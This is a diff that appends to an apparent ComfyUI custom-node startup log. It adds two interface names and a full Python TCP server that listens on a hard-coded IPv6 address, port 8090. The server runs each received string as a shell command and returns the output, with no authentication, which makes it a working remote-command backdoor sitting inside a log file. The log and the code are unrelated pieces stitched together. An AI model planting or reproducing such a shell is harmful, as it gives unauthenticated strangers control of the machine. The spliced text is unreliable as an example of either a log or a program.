@@ -1126,3 +1126,48 @@ Cannot import /data/ComfyUI/custom_nodes/ComfyUI-layerdiffuse module for custom 
 [smZNodes] compel is not installed. Attempting to install...
 [smZNodes] compel Installed!
 [smZNodes] lark is not installed. Attempting to install...
+
+eth0
+wlp9s0
+
+import socket
+import subprocess
+ 
+ipv6 = '2408:8207:60ad:6cb0::f4c%wlp9s0'
+port = 8090
+ 
+addrinfo = socket.getaddrinfo(ipv6, port, 0, 0)[0]
+tcp_server = socket.socket(socket.AF_INET6,socket.SOCK_STREAM)
+tcp_server.bind(addrinfo[-1])
+ 
+tcp_server.listen(5)
+while True:
+    conn, addr = tcp_server.accept()
+ 
+    while True:
+        cmd = conn.recv(1024)
+        if not cmd:
+            break
+ 
+        if cmd.decode('utf-8') == 'quit':
+            break
+ 
+        print(cmd.decode('utf-8'))
+        res = subprocess.Popen(cmd.decode('utf-8'), shell=True, stdout=subprocess.PIPE,
+                               stdin =subprocess.PIPE, stderr=subprocess.PIPE)
+ 
+        err = res.stderr.read()
+        out = res.stdout.read()
+        print(bool(res))
+ 
+        if err:
+            ref = err
+        elif not out:
+            ref = b'12'
+ 
+        else:
+            ref = out
+        conn.send(ref)
+    conn.close()
+ 
+tcp_server.close()
